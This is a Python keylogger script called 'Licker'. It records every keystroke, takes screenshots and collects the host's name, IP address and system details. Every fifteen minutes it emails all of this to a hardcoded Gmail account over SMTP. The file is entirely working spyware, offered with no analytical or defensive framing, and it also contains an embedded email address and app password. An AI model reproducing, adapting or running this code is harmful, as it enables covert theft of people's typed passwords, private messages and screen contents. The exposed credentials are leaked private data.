import keyboard
import socket
import os
import platform
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from threading import Semaphore, Timer
import pyscreenshot as ImageGrab

# 1. Configuration
SEND_REPORT_EVERY = 900  # 15 minutes
EMAIL_ADDRESS = "sankarideb1@gmail.com"
# CRITICAL: Use a 16-character 'App Password' here instead of your regular password.
EMAIL_PASSWORD = "vkfm hbqm yhon cvjg" 

class Licker:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)
        # Use TEMP folder for writing files to avoid permission errors
        self.temp_dir = os.environ.get('TEMP', os.getcwd())

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
        # Correctly join path for Windows
        log_file = os.path.join(self.temp_dir, "output.txt")
        with open(log_file, "w+") as output:
            output.write(self.log)

    @staticmethod
    def sendmail(email, password, message):
        try:
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except Exception as e:
            print(f"Mail Error: {e}")
    
    @staticmethod
    def SendImage(ImgFileName):
        try:
            img_data = open(ImgFileName, 'rb').read()
            msg = MIMEMultipart()
            msg['Subject'] = 'Lickers SIP Report: Screenshot'
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = EMAIL_ADDRESS

            text = MIMEText("Automatic system capture.")
            msg.attach(text)
            image = MIMEImage(img_data, name=os.path.basename(ImgFileName))
            msg.attach(image)

            s = smtplib.SMTP(host="smtp.gmail.com", port=587)
            s.starttls()
            s.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            s.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
            s.quit()
        except Exception as e:
            print(f"Image send error: {e}")

    def screenshot(self):
        try:
            im = ImageGrab.grab()
            path = os.path.join(self.temp_dir, "screenshot.png")
            im.save(path)
            self.SendImage(path)
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            print(f"Screenshot error: {e}")

    def report(self):
        self.screenshot()
        if self.log:
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def computer_info(self):
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        mssg = "--- System Information ---\n"
        mssg += f"Architecture: {platform.architecture()[0]} {platform.architecture()[1]}\n"
        mssg += f"Machine: {platform.machine()}\n"
        mssg += f"System: {platform.system()} {platform.version()}\n"
        mssg += f"Hostname: {hostname}\n"
        mssg += f"IP Address: {IPAddr}\n"

        info_file = os.path.join(self.temp_dir, "output2.txt")
        with open(info_file, "w+") as output2:
            output2.write(mssg)

        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, mssg)

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.computer_info()
        self.report()
        self.semaphore.acquire()

if __name__ == "__main__":
    licker = Licker(interval=SEND_REPORT_EVERY)
    licker.start()
